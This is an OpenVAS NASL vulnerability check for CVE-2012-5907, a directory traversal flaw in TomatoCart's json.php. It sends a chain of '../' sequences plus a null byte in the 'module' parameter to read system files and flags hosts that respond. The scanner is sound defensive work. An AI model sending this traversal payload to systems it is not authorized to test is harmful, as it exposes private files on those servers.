###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_tomatocart_dir_traversal_vuln.nasl 11374 2018-09-13 12:45:05Z asteins $
#
# TomatoCart 'json.php' Directory Traversal Vulnerability
#
# Authors:
# Sharath S <sharaths@secpod.com>
#
# Copyright:
# Copyright (c) 2012 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.901302");
  script_version("$Revision: 11374 $");
  script_cve_id("CVE-2012-5907");
  script_bugtraq_id(52766);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-09-13 14:45:05 +0200 (Thu, 13 Sep 2018) $");
  script_tag(name:"creation_date", value:"2012-11-28 10:32:05 +0530 (Wed, 28 Nov 2012)");
  script_name("TomatoCart 'json.php' Directory Traversal Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 SecPod");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/74459");
  script_xref(name:"URL", value:"http://www.mavitunasecurity.com/local-file-inclusion-vulnerability-in-tomatocart/");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/111291/TomatoCart-1.2.0-Alpha-2-Local-File-Inclusion.html");

  script_tag(name:"impact", value:"Successful exploitation could allow attackers to perform
  directory traversal attacks and read arbitrary files on the affected application
  and execute arbitrary script code.");

  script_tag(name:"affected", value:"TomatoCart version 1.2.0 Alpha 2 and prior");

  script_tag(name:"insight", value:"The flaw is due to improper validation of user supplied input via the
  'module' parameter to json.php, which allows attackers to read arbitrary files via a
  ../(dot dot) sequences.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"This host is installed with TomatoCart and is prone to directory
  traversal vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

cartPort = get_http_port(default:80);
if(!can_host_php(port:cartPort))exit(0);

files = traversal_files();

foreach dir (make_list_unique("/TomatoCart", "/tomatocart", "/", cgi_dirs(port:cartPort))){

  if(dir == "/") dir = "";
  cartUrl = dir + "/index.php";
  res = http_get_cache( item:cartUrl, port:cartPort );
  if( isnull( res ) ) continue;

  if( res =~ "HTTP/1.. 200" && ">TomatoCart<" >< res && '>Login<' >< res &&
      '>Create Account<' >< res && '>My Wishlist<' >< res ){

    foreach file (keys(files)){
      cartUrl = dir + "/json.php?action=3&module=" + crap(data:"../", length:3*15) + files[file] + "%00";

      if(http_vuln_check(port:cartPort, url:cartUrl, check_header:TRUE, pattern:file)){
        report = report_vuln_url(port:cartPort, url:cartUrl);
        security_message(port:cartPort, data:report);
        exit(0);
      }
    }
  }
}

exit(99);